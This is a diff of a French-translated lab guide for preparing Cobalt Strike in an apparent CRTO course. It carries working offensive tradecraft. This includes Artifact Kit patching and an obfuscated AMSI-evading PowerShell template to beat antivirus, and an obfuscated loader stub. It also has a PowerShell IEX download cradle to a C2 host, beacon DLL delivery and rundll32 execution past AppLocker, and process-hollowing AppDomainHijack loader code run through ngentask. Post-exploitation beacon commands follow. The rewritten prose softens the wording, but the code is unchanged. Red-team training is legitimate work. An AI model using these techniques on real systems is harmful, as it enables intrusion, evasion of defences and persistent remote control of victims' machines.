@@ -1,25 +1,19 @@
-# Lab — Préparation de Cobalt Strike  
+# Lab — Préparation de Cobalt Strike
 
-The objective is to setup Cobalt Strike.  Update Malleable C2 profile, create artifact, resource kit, listeners, load scripts, and disable AppLocker controls for first Beacon.  
+**Objectif :** préparer l'environnement Cobalt Strike utilisé dans le lab CRTO : Malleable C2 Profile, Artifact Kit, Resource Kit, listeners, scripts CNA et premier Beacon.
 
-* SSH to team server
-* Malleable C2 profile Edit (stage + post-ex + process-inject blocks)
-* Build **Artifact** Kit →  ThreatCheck + Ghidra clean
-* Build **Resource** Kit → fix template.x64.ps1 → ThreatCheck AMSI clean
-* Add Cobalt Strike Listeners 
-* Load CNA CS Script Manager
-* Generate & Host Payloads
-* Initial Beacon
-  * Enumerate AppLocker Policy
-  * Download Beacon DLL to Workstation
-  * Execute via rundll32
-  * Process Hollowing AppDomainHijack.dll
-* Connected Beacon Checklist
-* [Post Exploitation Enumeration](/cheatsheets/post-exploitation.md) 🚨  
-  * Local Privilege Escalation  
-  
+**Étapes de préparation :**
+- Se connecter en SSH au team server
+- Examiner les blocs `stage`, `post-ex` et `process-inject` du Malleable C2 Profile
+- Compiler l’**Artifact Kit** et contrôler les fichiers avec ThreatCheck et Ghidra
+- Préparer le **Resource Kit**, notamment `template.x64.ps1`, puis consulter les résultats de l’analyse AMSI
+- Configurer les listeners Cobalt Strike
+- Charger les scripts CNA dans Script Manager
+- Générer et héberger les fichiers du lab
+- Vérifier le premier Beacon : politique AppLocker, téléchargement de fichiers et processus hôte
+- Suivre la [fiche d'énumération Post-Exploitation](/cheatsheets/post-exploitation.md) et les contrôles de Privilege Escalation locale
 
-### SSH to team server
+### Se connecter au team server en SSH
 
 ```bash
 ssh attacker@10.0.0.5
@@ -28,9 +22,9 @@ cd /opt/cobaltstrike/profiles
 nano default.profile
 ```
 
-## Malleable C2 profile Edit
+## Modifier le Malleable C2 Profile
 
->Stage Block + Post-ex Block + Process-Inject Block
+Le profil Cobalt Strike contient notamment les blocs `stage`, `post-ex` et `process-inject`. Chacun correspond à des paramètres distincts de chargement, d’exécution ou d’injection.
 
 ```c
 stage {
@@ -81,7 +75,7 @@ process-inject {
 }
 ```
 
->Apply and validate Malleable C2 profile updates  
+> Vérifier la syntaxe et l’application du Malleable C2 Profile dans le lab. Les résultats dépendent de la version et de la configuration du team server.
 
 ```
 sudo /usr/bin/docker restart cobaltstrike-cs-1
@@ -89,11 +83,11 @@ sudo /usr/bin/docker restart cobaltstrike-cs-1
 sudo /usr/bin/docker logs cobaltstrike-cs-1
 ```
 
-## Build Artifact Kit
+## Préparer l’Artifact Kit
 
-### Patch patch.c in VSCode
+### Examiner `patch.c` avec Visual Studio Code
 
->Launch Visual Studio Code 🔵 > File > Open Folder → `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\` Open `src-common\patch.c`  
+> Ouvrir le dossier `C:\Tools\cobaltstrike\arsenal-kit\kits\artifact\` dans Visual Studio Code, puis consulter le fichier `src-common\patch.c`.
 
 ```cpp
 // line 45 REPLACE WITH (backwards while loop — different compiled bytecode, identical logic):
@@ -109,7 +103,7 @@ while ( x-- ) {
 }
 ```
 
->Build **artifacts** in WSL 🟣🐧Ubuntu  
+> Compiler les artifacts dans **Ubuntu sous WSL**, comme indiqué dans les supports du lab.
 
 ```cpp
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
@@ -117,27 +111,26 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
 ./build.sh mailslot VirtualAlloc 351363 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
 ```
 
-### ThreatCheck & Ghidra  
+### Examiner les résultats avec ThreatCheck et Ghidra
 
 ```powershell
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\tools\cobaltstrike\custom-artifacts\mailslot\artifact64big.exe"
 ```
 
->Ghidra to locate the flagged code at the offset ThreatCheck give  
+> ThreatCheck peut signaler un offset ou une zone du fichier. Ghidra permet d’examiner le code correspondant. L'absence de résultat dans un outil ne garantit pas qu'un autre moteur ne détectera pas le programme.
 
+## Préparer le Resource Kit
 
-## Build Resource Kit  
-
->Build **resources** templates in WSL 🟣🐧Ubuntu  
+> Les templates du Resource Kit sont préparés dans **Ubuntu sous WSL** et examinés dans Visual Studio Code.
 
 ```bash
 cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
 ```
 
->Visual Studio Code 🔵 - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `template.x64.ps1`  
-
->Replace System.dll' with obfuscation:  
+> Dans VS Code, ouvrir `C:\Tools\cobaltstrike\custom-resources\template.x64.ps1`.
+>
+> Le lab étudie notamment le traitement de la chaîne `System.dll` dans ce template PowerShell.
 
 ```powershell
 # Before (AMSI-detected):
@@ -147,7 +140,7 @@ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
 # 'J1N5cycrJ3RlbS4nKydkbGwnCg==' = base64('Sys'+'tem.'+'dll')
 ```
 
->Replace `Marshal.Copy` with WriteProcessMemory:  
+> Le cours compare aussi les appels `Marshal.Copy` et `WriteProcessMemory` dans le template.
 
 ```powershell
 # orginal code detected
@@ -162,119 +155,118 @@ $var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoi
 $var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
 ```
 
->Visual Studio Code 🔵 - File > Open Folder → `C:\Tools\cobaltstrike\custom-resources` Open: `compress.ps1` with obfuscation  
+> Ouvrir `C:\Tools\cobaltstrike\custom-resources\compress.ps1` dans Visual Studio Code afin d’examiner les transformations de texte présentées dans le lab.
 
 ```powershell
 SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
 ```
 
->ThreatCheck 🛡️ AMSI  
+> Contrôler le template PowerShell avec ThreatCheck dans le contexte **AMSI**.
 
 ```powershell
 cd C:\Tools\cobaltstrike\custom-resources\
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f .\template.x64.ps1 -e AMSI -t Script
 ```
 
-<img src="/images/threatchecks1.png">  
+<img src="/images/threatchecks1.png">
 
-## Cobalt Strike Listeners  
+## Configurer les listeners Cobalt Strike
 
-### Connect to Cobalt Strike
+### Se connecter à Cobalt Strike
 
-1. On the Windows taskbar, click on the Cobalt Strike icon.
-1. Fill in the connection details for the team server.
-  1. Host: `10.0.0.5`
-  1. Port: `50050`
-  1. Password: `Passw0rd!`
+1. Depuis la barre des tâches Windows, ouvrir Cobalt Strike.
+2. Renseigner les paramètres du **team server** de formation :
+   - Hôte : `10.0.0.5`
+   - Port : `50050`
+   - Mot de passe d’exemple du lab : `Passw0rd!`
 
-### Create Listeners
+### Créer des listeners
 
-Go to **Cobalt Strike > Listeners > Add** to create a new listener.
+Dans **Cobalt Strike > Listeners > Add**, ouvrir la configuration d’un nouveau listener.
 
-### HTTP Listener
+### Listener HTTP
 
-1. Name: `http`
-1. Payload: Beacon HTTP
-1. HTTP Hosts: `www.bleepincomputer.com`
-1. HTTP Host (Stager) : `www.bleepincomputer.com`
+- Nom : `http`
+- Payload : Beacon HTTP
+- HTTP Hosts : `www.bleepincomputer.com`
+- HTTP Host (Stager) : `www.bleepincomputer.com`
 
-<img src="/images/cs_setup1.png">  
+<img src="/images/cs_setup1.png">
 
-### SMB Listener
+### Listener SMB
 
-1. Name: `smb`
-1. Payload: Beacon SMB
-1. Pipename: `dotnet-diagnostic-6845-636768274066975`  
+- Nom : `smb`
+- Payload : Beacon SMB
+- Nom de named pipe indiqué dans le lab : `dotnet-diagnostic-6845-636768274066975`
 
-<img src="/images/cs_setup2.png">  
+<img src="/images/cs_setup2.png">
 
-### TCP Listener
+### Listener TCP
 
-1. Name: `tcp`
-1. Payload: Beacon TCP
-1. Port: `4444`
-1. Bind to localhost: False
+- Nom : `tcp`
+- Payload : Beacon TCP
+- Port : `4444`
+- Bind to localhost : `False`
 
-<img src="/images/cs_setup3.png">  
+<img src="/images/cs_setup3.png">
 
-### TCP (local) Listener
+### Listener TCP local
 
-1. Name: `tcp-local`
-1. Payload: Beacon TCP
-1. Port: `1337`
-1. Bind to localhost: True
+- Nom : `tcp-local`
+- Payload : Beacon TCP
+- Port : `1337`
+- Bind to localhost : `True`
 
 <img src="/images/cs_setup4.png">
 
-# Load CNA Scripts  
+## Charger les scripts CNA
 
->Script Manager > Load > CNA Script File 💡 Aggressor Scripts:  
+Dans **Script Manager > Load**, sélectionner les scripts Aggressor nécessaires aux modules du lab :
 
-* C:\Tools\cobaltstrike\arsenal-kit\kits\elevate\elevate.cna
-* C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna
-* C:\Tools\CS-Remote-OPs-BOF\Remote\Remote.cna
-* C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna
-* C:\Tools\cobaltstrike\custom-resources\resources.cna
-* C:\Tools\Kerbeus-BOF\kerbeus_cs.cna
-* C:\Tools\SQL-BOF\SQL\SQL.cna
-* C:\Tools\SCShell\CS-BOF\scshell.cna
+- `C:\Tools\cobaltstrike\arsenal-kit\kits\elevate\elevate.cna`
+- `C:\Tools\CS-Situational-Awareness-BOF\SA\SA.cna`
+- `C:\Tools\CS-Remote-OPs-BOF\Remote\Remote.cna`
+- `C:\Tools\cobaltstrike\custom-artifacts\mailslot\artifact.cna`
+- `C:\Tools\cobaltstrike\custom-resources\resources.cna`
+- `C:\Tools\Kerbeus-BOF\kerbeus_cs.cna`
+- `C:\Tools\SQL-BOF\SQL\SQL.cna`
+- `C:\Tools\SCShell\CS-BOF\scshell.cna`
 
-----  
+---
 
-# Generate & Host Payloads
+## Générer et héberger les fichiers du lab
 
-> ⚠️ **PREREQUISITE — First Update C2 Malleable Profile**  
+> **Prérequis :** consulter d'abord la [fiche Defense Evasion et Malleable C2](defence-evasion-lab-Malleable.md).
 
-> First CHECK [Defence evasion Malleable C2 profile](defence-evasion-lab-Malleable.md#part-1--malleable-c2-profile)
+<img src="/images/malleable-c2-profile-updates.png">
 
-<img src="/images/malleable-c2-profile-updates.png">  
+Les fichiers générés dépendent des paramètres de l’Artifact Kit chargé dans Cobalt Strike.
 
-> Generate payloads will use the custom artifact stubs.  
+1. Ouvrir **Payloads > Windows Stageless Generate All Payloads**.
+2. Choisir le dossier `C:\Payloads`.
+3. Cliquer sur **Generate**.
 
-1. Go to **Payloads > Windows Stageless Generate All Payloads**
-2. Folder: `C:\Payloads`
-3. Click **Generate**
+<img src="/images/generate_payloads.png">
 
-<img src="/images/generate_payloads.png">  
+### Scripted Web Delivery
 
-## Scripted Web Delivery
+Le cours présente un fichier PowerShell 64 bits distribué par le serveur du lab. L’authenticité et la provenance des scripts téléchargés doivent toujours être vérifiées.
 
-Host a 64-bit PowerShell payload.  
 ```
 Cobalt Strike > Attacks > Scripted Web Delivery
 Select the http listener.
 Click Launch.
 ```
 
-<img src="/images/scripted-web-delivery-http-listener.png">  
+<img src="/images/scripted-web-delivery-http-listener.png">
 
->Example given by Cobalt Strike:  
+> Exemple de commande présenté par Cobalt Strike :
 
 ```
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://172.16.0.10:80/a'))"
 ```
 
-## Generate Stageless Beacon DLL  
+## Générer une DLL Beacon stageless
 
 ```
 Cobalt Strike > Payloads > Windows Stageless Payload
@@ -283,7 +275,7 @@ Cobalt Strike > Payloads > Windows Stageless Payload
   Save as:   C:\Payloads\beacon.dll
 ```
 
-## Host Payload via CS Web Server
+## Héberger le fichier sur le serveur web Cobalt Strike
 
 ```
 Site Management > Host File
@@ -292,13 +284,13 @@ Site Management > Host File
   Port:   80
 ```
 
->Example given by Cobalt Strike:  
+> Exemple fourni par Cobalt Strike :
 
 ```
 http://172.16.0.10:80/beacon.dll
 ```
 
-## Generate RAW BIN Beacon shellcode
+## Générer un Beacon au format binaire Raw
 
 ```
 Cobalt Strike >Payloads > Windows Stageless Payload
@@ -308,12 +300,11 @@ Click Generate.
 Save to C:\Payloads\http_x64.xprocess.bin
 ```
 
-### Build AppDomainHijack.dll  
+### Préparer `AppDomainHijack.dll`
 
->Visual Studio 2022 > create > `Class Library (.NET Framework)` > Add the shellcode to the project🟡.  
->Add > Existing Item > `C:\Payloads\http_x64.xprocess.bin` and Properties > Set Build Action > `Embedded Resource`  
+Dans **Visual Studio 2022**, le lab utilise un projet `Class Library (.NET Framework)` et le fichier `C:\Payloads\http_x64.xprocess.bin`.
 
->Process Hollowing Malware `Class1.cs`:  
+La propriété **Build Action > Embedded Resource** permet d’inclure ce fichier comme ressource de l’assembly. Le code étudié figure dans `Class1.cs`.
 
 ```cpp
 using System;
@@ -576,29 +567,31 @@ namespace AppDomainHijack
 }
 ```
 
->Build release version `C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll`  
-⚠️ Process Hollowing ⚠️ Above is the process hollowing code from Malware Essentials chapter.  
+> Compiler le projet en mode **Release**. Le chemin d'exemple est `C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll`.
 
-## ThreatCheck AppDomainHijack.dll  
+**Process Hollowing :** ce passage fait référence au chapitre *Malware Essentials* et à l’exécution dans le contexte d’un processus Windows.
+
+### Contrôler `AppDomainHijack.dll` avec ThreatCheck
 
 ```
 C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f "C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll"
 ```
 
->If ThreatCheck not clean check with Ghidra!  
->If ThreatCheck clean copy for hosting:  
+> Si ThreatCheck signale une portion du fichier, analyser le résultat et l’offset avec Ghidra. Consigner la version du binaire et du moteur utilisé.
+>
+> Si l’analyse ne signale rien, ce résultat reste limité au test effectué.
 
 ```
 cp C:\Users\Attacker\source\repos\AppDomainHijack\bin\Release\AppDomainHijack.dll C:\Payloads\
 ```
 
-# Initial Beacon
+## Premier Beacon
 
->On compromised 🖥️ workstation 💻  
+**Contexte :** workstation de formation sur laquelle des identifiants sont fournis.
 
-## Enumerate AppLocker Policy
+### Examiner la politique AppLocker
 
->Initial Access, Provided credentials, Locally logged onto compromised 🖥️ workstation 💻  
+Dans le scénario Initial Access, l’utilisateur dispose d’une session locale sur la workstation du lab. Le contrôle consiste à identifier les règles AppLocker et les restrictions associées à son compte.
 
 ```powershell
 # Confirm AppLocker is enforcing (ConstrainedLanguage = active)
@@ -617,45 +610,42 @@ icacls C:\Windows\Tasks
 icacls C:\Windows\Temp
 ```
 
->🚨once bypass path method found to avoid AppLocker proceed to download beacon payload 🚨  
+> L’évaluation des politiques AppLocker détermine les exécutables et DLL autorisés par la configuration. Les observations doivent être rapprochées des événements AppLocker.
 
-## Download Beacon DLL to Workstation
+### Télécharger la DLL sur la workstation
 
->On `lon-wkstn-1` as `pchilds` — `Invoke-WebRequest` works in ConstrainedLanguage:  
+Sur `lon-wkstn-1` avec le compte `pchilds`, la fiche illustre l’utilisation de `Invoke-WebRequest` en environnement `ConstrainedLanguage`.
 
 ```powershell
 cd C:\Windows\Tasks\
 Invoke-WebRequest -Uri 'http://www.bleepincomputer.com/beacon.dll' -OutFile 'C:\Windows\Tasks\beacon.dll'
 ```
 
-## Execute via rundll32
+### Examiner l’exécution via `rundll32`
 
 ```cmd
 rundll32.exe C:\Windows\Tasks\beacon.dll,StartW
 ```
 
->Initial Beacon connect to cobalt strike  
+> Après l’étape du lab, vérifier la connexion éventuelle du Beacon dans Cobalt Strike, ainsi que le processus hôte et l’identité du compte.
 
-<img src="/images/applocker-challenge02.png" width=860>  
+<img src="/images/applocker-challenge02.png" width=860>
 
+## Process Hollowing et `AppDomainHijack.dll`
 
-## Process Hollowing 🧨 AppDomainHijack.dll  
+**Contexte :** exercice Assume Breach avec une session de faible intégrité déjà disponible sur la workstation. Le scénario ne nécessite pas de campagne de phishing.
 
->Assume-breach with initial low privilege user beacon💻.  
->No phishing needed OPSEC-🟢SAFE  
+### Fichier `AppDomainHijack.dll`
 
-
-### Upload AppDomainHijack.dll  
-
->beacon>   
+Le bloc suivant concerne le transfert de fichier depuis la session Beacon du lab.
 
 ```
 upload C:\Payloads\AppDomainHijack.dll
 ```
 
-### Use AppDomainHijack.dll & ngentask Execute  
+### Étudier `AppDomainHijack.dll` et `ngentask.exe`
 
->On compromised 🖥️ workstation 💻   
+Ce scénario porte sur un processus .NET Framework et sur la manière dont il charge une assembly. Le résultat doit être vérifié dans la console Cobalt Strike et dans la télémétrie de la machine.
 
 ```powershell
 # On foothold workstation — set APPDOMAIN env vars and run ngentask (OPSEC-🟢SAFE)
@@ -672,13 +662,16 @@ $env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral
 # Beacon appears from msedge.exe
 ```
 
-----  
+---
 
-# Connected Beacon Checklist  
+## Contrôles après connexion du Beacon
 
->[Initial Access without phishing in exam](/labs/Initial-Access-lab.md) beacon commands:  
-* ppid set to explorer.exe PID before `spawnto` and before `execute-assembly` or `powerpick`  
-* `spawnto x64 %windir%\sysnative\werfault.exe` before using fork&run operations `execute-assembly`, `powerpick`  
+Consulter [le lab Initial Access](/labs/Initial-Access-lab.md) pour la distinction entre Assume Breach et livraison à distance.
+
+- Vérifier l’identité de la session, le PID et la relation parent-enfant des processus.
+- Identifier le rôle de `ppid` dans le contexte du Beacon.
+- Examiner le réglage `spawnto` et les commandes utilisant le mécanisme fork-and-run, notamment `execute-assembly` et `powerpick`.
+- Ne pas confondre les paramètres du Beacon avec ceux du Service EXE de l’Artifact Kit.
 
 ```cs
 sleep 3 20                                      // reduce check-in noise
@@ -693,18 +686,15 @@ getuid                                          // confirm user context
 netstat                                         // other network connections 
 ```
 
-----  
+---
 
-# Post Exploitation Enumeration 🔍 
+## Énumération Post-Exploitation
 
->[Post Exploitation Checks🚨](/cheatsheets/post-exploitation.md)  
+Consulter la [fiche Post-Exploitation](/cheatsheets/post-exploitation.md) pour les contrôles locaux et de domaine.
 
->Enumeration commands to execute on workstation
->Find 🕵️ local privilege, sessions, users, escalation, before moving to domain enumeration.  
+**Depuis la workstation :** recenser les utilisateurs, groupes, sessions, permissions et configurations du système avant de passer à l’énumération Active Directory.
 
-## Local Privilege Escalation 🔥 
+### Privilege Escalation locale
 
->[Privilege Escalation via WMI subscription or weak service registry permissions to SYSTEM Beacon](/labs/Privilege-Escalation-lab.md)  
-* Weak service registry (powerpick — 🟢SAFE, no spawn)  
-* steal_token from an existing SYSTEM process (🟢SAFE)  
+La [fiche Privilege Escalation](/labs/Privilege-Escalation-lab.md) détaille les erreurs de permissions des clés Registry de services et les mécanismes WMI associés aux scénarios du lab.
 
